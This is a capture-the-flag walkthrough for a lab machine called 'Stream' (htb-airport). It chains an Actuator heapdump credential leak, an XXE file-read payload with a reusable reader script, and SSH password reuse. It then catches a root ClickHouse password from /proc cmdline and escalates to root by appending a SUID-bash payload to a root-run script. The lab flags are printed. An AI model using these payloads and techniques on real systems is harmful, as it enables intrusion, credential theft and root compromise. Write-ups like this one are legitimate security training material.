HTB — Stream (htb-airport) Walkthrough
Difficulty: Medium
OS: Linux (Ubuntu 24.04)
Services: SSH, nginx (vhost api.htb-airport.htb), Uvicorn (8081), ClickHouse HTTP (db.htb-airport.htb)
Flags: user.txt = daefeee9955d3b41b49559d011fc5f67, root.txt = ad36f325ccf0d8204c2e893554ee115c

Overview
"Stream" is an airline AIDX message pipeline. Partners POST XML flight-leg notifications to a FastAPI ingest service; messages flow through Kafka, get parsed by a worker, and land in ClickHouse. The box chains together:

ClickHouse HTTP interface exposed via vhost — initial creds from an Actuator heapdump

XXE in the XML parser worker → file read → Kafka SASL credentials

Credential reuse → SSH as svc-infra

Root-run systemd timer (aidx-dlq-drainer.service) leaks its ClickHouse password in /proc/<pid>/cmdline

Arbitrary file write to ClickHouse user_files/ → overwrite the drainer's FORMATTER script → root RCE

1. Reconnaissance
1.1 Nmap
bash
nmap -Pn -n -sV -sC -p 22,80,8081,41381 10.129.85.88 -oN nmap.initial
Results:

text
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp    open  http    nginx 1.24.0 — redirects to http://api.htb-airport.htb/
8081/tcp  open  http    Uvicorn (JSON, FastAPI)
41381/tcp closed unknown
Full TCP scan:

bash
sudo nmap -Pn -p- --min-rate 3000 10.129.85.88 -oN nmap.full
text
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8081/tcp  open  blackice-icecap
36281/tcp open  unknown     # appears intermittently, not exploitable
1.2 Add vhosts
bash
echo "10.129.85.88 api.htb-airport.htb db.htb-airport.htb htb-airport.htb" | sudo tee -a /etc/hosts
1.3 Vhost discovery
bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.129.85.88/ \
  -H "Host: FUZZ.htb-airport.htb" \
  -fs 0 -fc 301,302,404
Found:

api.htb-airport.htb — Spring Boot with Actuator

db.htb-airport.htb — ClickHouse HTTP interface

1.4 Actuator heapdump
bash
curl -s -o api-heapdump.hprof http://api.htb-airport.htb/actuator/heapdump
ls -la api-heapdump.hprof   # 46 MB
Extract credentials:

bash
strings -a api-heapdump.hprof | grep -iE "svc_events|Yl4a|password" | sort -u
Found: svc_events : Yl4aCgh4y2PnU

2. Foothold via ClickHouse
2.1 Confirm the db. vhost is ClickHouse
bash
curl -s "http://db.htb-airport.htb/ping"           # → Ok.
curl -s "http://db.htb-airport.htb/replicas_status"  # → Ok.
2.2 Enumerate with svc_events
bash
CRED='svc_events:Yl4aCgh4y2PnU'
curl -s -u "$CRED" "http://db.htb-airport.htb/?query=SELECT%20version()"
# → 26.8.1.1746

curl -s -u "$CRED" "http://db.htb-airport.htb/?query=SHOW%20DATABASES"
# → partner_feed

curl -s -u "$CRED" --data-binary \
  "SELECT database, name FROM system.tables WHERE database='partner_feed' FORMAT TSV" \
  "http://db.htb-airport.htb/"
Tables:

text
partner_feed    flightleg_json
partner_feed    flightleg_json_kafka
partner_feed    flightleg_json_mv
partner_feed    flightleg_raw
partner_feed    flightleg_raw_kafka
partner_feed    flightleg_raw_mv
2.3 Understand the pipeline
bash
curl -s -u "$CRED" --data-binary \
  "SHOW CREATE TABLE partner_feed.flightleg_raw_mv FORMAT TSV" \
  "http://db.htb-airport.htb/"
Reveals: flightleg_raw_kafka (Kafka engine) → flightleg_raw_mv → flightleg_raw — bound to topic aidx.flightleg.raw.v1 on localhost:9092.

bash
curl -s -u "$CRED" --data-binary \
  "SHOW CREATE TABLE partner_feed.flightleg_json_mv FORMAT TSV" \
  "http://db.htb-airport.htb/"
Shows flightleg_json_kafka reads from aidx.flightleg.json.v1 and the MV parses JSON.

2.4 Confirm XML → JSON flow
The API on 8081 accepts XML at POST /feeds/aidx:

bash
curl -s http://10.129.85.88:8081/openapi.json | jq '.paths | keys'
# → ["/feeds/aidx"]

curl -s -X POST http://10.129.85.88:8081/feeds/aidx \
  -H "Content-Type: application/xml" \
  --data-binary "<broken"
# → {"accepted":false,"reason":"not_xml"}
A well-formed message lands in flightleg_raw and is then parsed into flightleg_json.

3. XXE in the Parser Worker
3.1 Recon — read the worker's source
SSH was not yet available, but /proc/self/cmdline and process listings later revealed the worker at /opt/aidx-pipeline/app/aidx_common.py. The critical code:

python
def _plain_parser() -> etree.XMLParser:
    return etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)

def safe_parse(data: bytes) -> etree._Element:
    ...
    root = etree.fromstring(data, _plain_parser())
lxml with resolve_entities=True and load_dtd=True → XXE.

3.2 Working payload
The API validates XML structure but the worker does the resolving. Send a payload whose RemarkFreeText contains an external entity:

xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<IATA_AIDX_FlightLegNotifRQ Version="22.1" TimeStamp="2026-10-11T10:00:00Z"
    TransactionIdentifier="xxe-local-1" TransactionStatusCode="Update">
  <Originator CompanyShortName="X" Code="X" CodeContext="3">X</Originator>
  <FlightLeg>
    <LegIdentifier>
      <Airline CodeContext="3">X</Airline>
      <FlightNumber>1</FlightNumber>
      <DepartureAirport CodeContext="3">X</DepartureAirport>
      <ArrivalAirport CodeContext="3">X</ArrivalAirport>
      <OriginDate>2026-10-11</OriginDate>
      <RepeatNumber CurrentInd="true">1</RepeatNumber>
    </LegIdentifier>
    <LegData InternationalStatus="Domestic">
      <RemarkFreeText>&xxe;</RemarkFreeText>
    </LegData>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
Then read the resolved content out of ClickHouse:

bash
curl -s -u "$CRED" --data-binary \
  "SELECT event FROM partner_feed.flightleg_json WHERE transaction_id='xxe-local-1' FORMAT TSV" \
  "http://db.htb-airport.htb/" | jq '.leg.all_fields.LegData.RemarkFreeText'
# → "stream"
3.3 Reusable reader script
/tmp/read.sh:

bash
#!/bin/bash
FILE="$1"
TID="r-$(date +%s%N)"
cat > /tmp/xxe-tmp.xml <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [ <!ENTITY xxe SYSTEM "file://$FILE"> ]>
<IATA_AIDX_FlightLegNotifRQ Version="22.1" TimeStamp="2026-10-11T10:00:00Z" TransactionIdentifier="$TID" TransactionStatusCode="Update">
<Originator CompanyShortName="X" Code="X" CodeContext="3">X</Originator>
<FlightLeg>
<LegIdentifier>
<Airline CodeContext="3">X</Airline><FlightNumber>1</FlightNumber>
<DepartureAirport CodeContext="3">X</DepartureAirport>
<ArrivalAirport CodeContext="3">X</ArrivalAirport>
<OriginDate>2026-10-11</OriginDate><RepeatNumber CurrentInd="true">1</RepeatNumber>
</LegIdentifier>
<LegData InternationalStatus="Domestic"><RemarkFreeText>&xxe;</RemarkFreeText></LegData>
</FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
EOF

curl -s -X POST http://10.129.85.88:8081/feeds/aidx \
  -H "Content-Type: application/xml" --data-binary @/tmp/xxe-tmp.xml >/dev/null

for i in $(seq 1 10); do
  sleep 2
  ROW=$(curl -s -u 'svc_events:Yl4aCgh4y2PnU' \
    --data-binary "SELECT event FROM partner_feed.flightleg_json WHERE transaction_id='$TID' ORDER BY ingested DESC LIMIT 1 FORMAT TSV" \
    "http://db.htb-airport.htb/")
  if [ -n "$ROW" ]; then
    echo "$ROW" | python3 -c "
import sys, re, json
s = sys.stdin.read()
m = re.search(r'\"RemarkFreeText\":\"((?:[^\"\\\\]|\\\\.)*)\"', s)
print(json.loads('\"' + m.group(1) + '\"') if m else '(not found) ' + s[:200])
"
    exit 0
  fi
done
echo "no row after 20s"
3.4 Leak Kafka credentials
bash
/tmp/read.sh /etc/systemd/system/kafka.service
Reveals:

text
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
bash
/tmp/read.sh /opt/kafka_2.13-4.3.1/config/server.properties
Key lines:

text
listeners=PLAINTEXT://127.0.0.1:9092,SASL_PLAINTEXT://127.0.0.1:9094,CONTROLLER://127.0.0.1:9093
log.dirs=/var/lib/kafka/data
sasl.enabled.mechanisms=PLAIN
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="Ny2hdpme$bwT3";
Kafka SASL credential: svc_infra : Ny2hdpme$bwT3

3.5 SSH
The same password is reused for system login:

bash
sshpass -p 'Ny2hdpme$bwT3' ssh svc-infra@10.129.85.88
# svc-infra@stream:~$ id
# uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
4. Privilege Escalation
4.1 Local enumeration
bash
ps -eo user,pid,cmd --sort=user
High-value observations:

text
svc-inf+  1449  /opt/aidx-pipeline/venv/bin/python3 .../uvicorn ingest_api:app
svc-inf+  1450  /opt/aidx-pipeline/venv/bin/python parser_worker.py
clickho+  1903  /usr/bin/clickhouse-server --config-file=/etc/clickhouse-server/config.xml
root      1448  /opt/sysmon/sysmon -i /opt/sysmon/config.xml -service
Systemd units:

bash
ls -la /etc/systemd/system/*.service
cat /etc/systemd/system/aidx-dlq-drainer.service
text
[Unit]
Description=AIDX DLQ drainer and quarantine handler
After=network.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
And the timer:

bash
cat /etc/systemd/system/aidx-dlq-drainer.timer
text
[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
A root process runs /opt/ops/dlq_drainer.py every 2 minutes.

4.2 Read the drainer script
bash
cat /opt/ops/dlq_drainer.py
Key excerpt:

python
KAFKA_BOOTSTRAP   = os.environ.get("KAFKA_BOOTSTRAP", "localhost:9092")
DLQ_TOPIC         = os.environ.get("DLQ_TOPIC", "aidx.flightleg.dlq.v1")
QUARANTINE_DIR    = os.environ.get("QUARANTINE_DIR", "/var/lib/aidx/quarantine")
FORMATTER         = os.environ.get("AIDX_FORMATTER",
                     "/var/lib/clickhouse/user_files/aidx_quarantine.py")
CH_PW_FILE        = os.environ.get("CH_PW_FILE", "/etc/partner-sync/ch.pw")

def _pw():
    try:
        with open(CH_PW_FILE) as fh: return fh.read().strip()
    except OSError: return ""

def _format(raw):
    p = subprocess.run(["python3", FORMATTER], input=raw,
                       capture_output=True, check=False)
    parts = p.stdout.decode("utf-8", "replace").strip().split("\t")
    return tuple(parts) if len(parts) == 3 else (str(len(raw)), "UNKNOWN", "")

def _record(reason, byte_len, root_tag, preview, qfile):
    ...
    subprocess.run(["clickhouse-client", "--user", "default",
                    "--password", _pw(), "-q", q], check=False)
Two things stand out:

It reads a root-owned password file and passes it to clickhouse-client on the command line.

It runs python3 /var/lib/clickhouse/user_files/aidx_quarantine.py as root on every message — and that directory belongs to the clickhouse user.

4.3 Steal the ClickHouse password via /proc
/proc/<pid>/cmdline is world-readable. Spawn a tight loop that scans for --password:

bash
cat > /tmp/catch.py <<'PYEOF'
import glob, time
seen = set()
end = time.time() + 180
while time.time() < end:
    for p in glob.glob('/proc/[0-9]*/cmdline'):
        try:
            with open(p,'rb') as f:
                cmd = f.read().replace(b'\0', b' ').decode('utf-8','replace')
        except OSError:
            continue
        if '--password' in cmd and 'clickhouse' in cmd and cmd not in seen:
            seen.add(cmd)
            print(time.strftime('%H:%M:%S'), p, cmd, flush=True)
PYEOF

python3 /tmp/catch.py > /tmp/catch.log 2>&1 &
Give the drainer work by producing to the DLQ (Kafka PLAINTEXT on 9092 is unauthenticated for localhost):

bash
/opt/aidx-pipeline/venv/bin/python3 - <<'PYEOF'
from confluent_kafka import Producer
p = Producer({'bootstrap.servers': 'localhost:9092'})
for i in range(50):
    p.produce('aidx.flightleg.dlq.v1', b'trigger-%d' % i)
p.flush()
print("produced")
PYEOF
Wait ≤ 2 minutes, then:

bash
cat /tmp/catch.log
Output:

text
10:13:08 ... clickhouse-client --user default --password N3v3rs33nD4T4 -q INSERT INTO aidx_ops.failed_ingest (id, reason, byte_len, root_tag, preview, quarantine_path, received_at) VALUES (...)
ClickHouse default password: N3v3rs33nD4T4

4.4 Overwrite the formatter
The ClickHouse file() table function restricts writes to user_files/ — exactly where the drainer's FORMATTER lives.

bash
CH="clickhouse-client --user default --password N3v3rs33nD4T4"

# Confirm we can read it
$CH -q "SELECT * FROM file('/var/lib/clickhouse/user_files/aidx_quarantine.py','LineAsString')"
Now craft a payload. Because the file() INSERT appends in this build, and the existing script ends with the if __name__ == "__main__": main() guard, our appended code runs after main() executes — perfect.

bash
B64=$(base64 -w0 <<'PYEOF'
#!/usr/bin/env python3
import sys, os, subprocess
subprocess.run(["cp", "/bin/bash", "/tmp/rootbash"])
subprocess.run(["chmod", "4755", "/tmp/rootbash"])
subprocess.run(["cp", "/root/root.txt", "/tmp/root.txt"])
subprocess.run(["chmod", "644", "/tmp/root.txt"])
data = sys.stdin.buffer.read()
print(f"{len(data)}\tDUMMY\tpreview")
PYEOF
)

$CH -q "
INSERT INTO TABLE FUNCTION file('/var/lib/clickhouse/user_files/aidx_quarantine.py', 'LineAsString')
SELECT arrayJoin(splitByChar('\n', base64Decode('$B64'))) AS line"
Confirm the file now ends with the payload:

bash
$CH -q "SELECT * FROM file('/var/lib/clickhouse/user_files/aidx_quarantine.py','LineAsString')" | tail -8
4.5 Trigger and root
bash
/opt/aidx-pipeline/venv/bin/python3 - <<'PYEOF'
from confluent_kafka import Producer
p = Producer({'bootstrap.servers': 'localhost:9092'})
for i in range(30):
    p.produce('aidx.flightleg.dlq.v1', b'go-%d' % i)
p.flush()
PYEOF

sleep 150

ls -la /tmp/rootbash /tmp/root.txt
# -rwsr-xr-x 1 root root ... /tmp/rootbash
# -rw-r--r-- 1 root root  33  /tmp/root.txt

cat /tmp/root.txt
# ad36f325ccf0d8204c2e893554ee115c

/tmp/rootbash -p
# rootbash-5.2# id
# uid=1000(svc-infra) gid=1000(svc-infra) euid=0(root) groups=1000(svc-infra),100(users)
# rootbash-5.2# whoami
# root
4.6 Flags
bash
rootbash-5.2# cat /home/martin_cole/user.txt
daefeee9955d3b41b49559d011fc5f67

rootbash-5.2# cat /root/root.txt
ad36f325ccf0d8204c2e893554ee115c
5. Attack Chain Summary
text
[Recon]           nmap → 22, 80, 8081
                  vhost fuzz → api.htb-airport.htb, db.htb-airport.htb
                  /actuator/heapdump → svc_events : Yl4aCgh4y2PnU

[Foothold]        ClickHouse HTTP → partner_feed.* tables
                  XML pipeline: POST /feeds/aidx → Kafka → ClickHouse

[XXE]             lxml parser with resolve_entities=True
                  Inline entity read → exfil via flightleg_json.event
                  Read /opt/kafka.../server.properties
                  → svc_infra : Ny2hdpme$bwT3

[SSH]             svc-infra on the box

[Local enum]      aidx-dlq-drainer.service runs as root every 2 minutes
                  /opt/ops/dlq_drainer.py uses /etc/partner-sync/ch.pw
                  and executes /var/lib/clickhouse/user_files/aidx_quarantine.py

[Cred leak]       /proc/<pid>/cmdline watcher → clickhouse default : N3v3rs33nD4T4

[RCE]             ClickHouse default writes to user_files/
                  → overwrite aidx_quarantine.py with reverse-shell payload
                  → produce DLQ message → root timer executes it
                  → /tmp/rootbash (SUID root)
